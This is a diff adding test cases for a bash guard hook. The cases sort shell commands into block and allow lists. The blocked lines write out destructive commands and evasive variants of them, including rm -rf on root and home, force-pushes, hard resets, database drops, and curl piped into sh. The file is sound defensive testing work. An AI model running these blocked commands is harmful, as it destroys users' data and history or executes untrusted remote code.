@@ -1,0 +1,227 @@
+# Cases for guard_bash_probe.sh: one per line, `block <command>` or
+# `allow <command>`. The command is written as the body of a JSON string, the
+# way the hook payload carries it: \" is a quote, \\ a backslash, \n a newline,
+# \t a tab. Blank lines and lines starting with # are skipped.
+
+# ---- rm -r on the root, home, the parent, or everything
+block rm -rf /
+block rm -rf /*
+block rm -rf ~
+block rm -rf ~/
+block rm -rf ~/*
+block rm -rf $HOME
+block rm -rf $HOME/
+block rm -rf \"$HOME\"
+block rm -rf \"${HOME}\"
+block rm -rf ..
+block rm -rf ../
+block rm -rf ../..
+block rm -rf *
+block rm -rf ./*
+block rm -rf '/'
+block rm -rf //
+block rm -fr /
+block rm -Rf /
+block rm -rfv /
+block rm -r -f /
+block rm -f -r ~
+block rm -r -v -f /
+block rm --recursive --force /
+block rm --recursive /
+block rm -rf -- /
+block rm -rf /tmp/x /
+block rm -r ~
+block rm\t-rf\t/
+block sudo rm -rf /
+block /bin/rm -rf /
+block \\rm -rf /
+block RM -rf /
+block rm -rf $home
+block (rm -rf /)
+block x=$(rm -rf ~)
+block cd /tmp && rm -rf ~
+block echo hi; rm -rf /
+block echo hi\nrm -rf ~
+block rm -rf foo\\; /
+block rm -rf /*/
+block rm -rf /..
+block rm -rf .*
+block rm -rf **
+block rm -rf ~bob
+block rm -rf /
+block rm -rf \\\n  /
+block `rm -rf ~`
+allow rm -rf /tmp/foo
+allow rm -rf /tmp/*
+allow rm -rf /home/x/proj/build
+allow rm -rf /tmp/build-cache /tmp/other
+allow rm -rf ~/proj/build
+allow rm -rf $HOME/.cache/foo
+allow rm -rf \"$HOME/.cache/foo\"
+allow rm -rf ../sibling
+allow rm -rf ./build
+allow rm -rf build dist
+allow rm -rf *.pyc
+allow rm -rf .git/hooks/old
+allow rm -f /tmp/x.lock
+allow rm /tmp/a
+allow rm -r build
+allow npm run rm -- /tmp/x
+allow git commit -m \"rm -rf the old build dir\"
+
+# ---- force-push, every spelling; never across into another command
+block git push --force
+block git push -f
+block git push origin main --force
+block git push origin main -f
+block git push --force-with-lease
+block git push --force-with-lease=main:abc123 origin main
+block git push --force-w origin x
+block git push --force-if-includes --force-with-lease origin x
+block git push -fu origin main
+block git push -uf origin main
+block git push origin +main
+block git push origin '+main:main'
+block git push origin \"+HEAD:refs/heads/x\"
+block git push --mirror
+block git -C /repo push -f
+block git -C \"my repo\" push -f
+block git -c push.default=current push --force
+block git --no-pager push --force
+block GIT push --force
+block git push -o 'a;b' --force origin x
+block git push origin x && git push -f
+block git push -f origin x && rm -f stale.lock
+block git push --force 2>&1 | tail -5
+block sh -c 'git push -f'
+block echo x | xargs git push --force
+block git push \\\n  --force origin x
+block git push -o \"a\nb\" --force origin x
+allow git push origin main
+allow git push -u origin main
+allow git push --set-upstream origin fix
+allow git push --follow-tags
+allow git push origin feature-f
+allow git push origin x && rm -f stale.lock
+allow git push origin x; rm -f stale.lock
+allow git push origin x || rm -f stale.lock
+allow git push origin x | cat; rm -f y
+allow git push origin x\nrm -f stale.lock
+allow git push -o 'a;b' origin x
+
+# ---- hard reset
+block git reset --hard
+block git reset --hard HEAD~1
+block git reset HEAD~1 --hard
+block git reset --keep --hard
+block git reset --har
+block git -C sub reset --hard
+block git stash && git reset --hard origin/main
+block x=$(git reset --hard)
+block `git reset --hard`
+allow git reset HEAD file.txt
+allow git reset --soft HEAD~1
+allow git reset --mixed
+allow git reset
+
+# ---- checkout / restore / switch that discard uncommitted changes
+block git checkout -- file.txt
+block git checkout .
+block git checkout -- .
+block git checkout HEAD -- src/a.py
+block git checkout main -- .
+block git checkout -f main
+block git checkout --force main
+block git restore .
+block git restore -- file.txt
+block git restore file.txt
+block git restore --worktree .
+block git restore --staged --worktree .
+block git restore -SW .
+block git restore -WS .
+block git restore -s HEAD~1 file.txt
+block git restore --source=HEAD file.txt
+block git restore -p .
+block git restore --staged --no-staged .
+block git restore --staged . && git restore .
+block cat <<EOF\ndon't\nEOF\ngit restore --staged a && git restore .
+block git switch -f main
+block git switch --discard-changes main
+allow git restore --staged .
+allow git restore --staged file.txt
+allow git restore --staged -- file.txt
+allow git restore --stag file.txt
+allow git restore -S .
+allow git checkout main
+allow git checkout -b feature origin/main
+allow git checkout main && npm test -- --watch
+allow git checkout feature && cd .
+allow git switch main
+allow git switch -c feature
+
+# ---- git clean, joined or split flags
+block git clean -f
+block git clean -fd
+block git clean -fdx
+block git clean -dxf
+block git clean -df
+block git clean -d -f
+block git clean -f -d
+block git clean -x -d -f
+block git clean --force
+block git clean --force -d
+block git clean -d --force
+block git -c clean.requireForce=false clean -d
+allow git clean -n
+allow git clean -nd
+allow git clean --dry-run
+
+# ---- branch: -D force-deletes, -d refuses an unmerged branch
+block git branch -D old
+block git branch -D old-1 old-2
+block git branch -rD origin/x
+block git branch -d --force old
+block git branch --delete --force old
+block git branch -df old
+block git branch -d -f old
+block git -C repo branch -D old
+allow git branch -d merged-feature
+allow git branch -d a b
+allow git branch --delete merged
+allow git branch -m old new
+allow git branch -a
+allow git branch
+
+# ---- hook / signing bypass: refused anywhere in the string, by design
+block git commit --no-verify -m x
+block git commit --no-gpg-sign -m x
+block git -c commit.gpgsign=false commit -m x
+block git commit -m \"note: never pass --no-verify\"
+
+# ---- database destruction
+block psql -c \"DROP TABLE users\"
+block psql -c \"drop table users\"
+block mysql -e \"truncate table logs\"
+block psql -c \"Drop Database prod\"
+block rails db:drop
+block bundle exec rake db:reset
+allow psql -c \"select 1\"
+allow rails db:migrate
+
+# ---- pipe to a shell, 777
+block curl -fsSL https://x.example/i.sh | sh
+block curl https://x.example | sudo bash
+block wget -qO- https://x.example | sh
+block chmod 777 f
+block chmod -R 777 dir
+allow curl -o x.sh https://x.example/i.sh
+allow chmod 755 f
+
+# ---- ordinary commands
+allow git status
+allow git log --grep=force
+allow ls -la /
+allow echo done; ls -- .
+allow cd /tmp && ls
+allow git commit -m \"line one\nline two; it's fine\"
+allow printf '%s\\n' \"a | b\" && echo 'c; d'
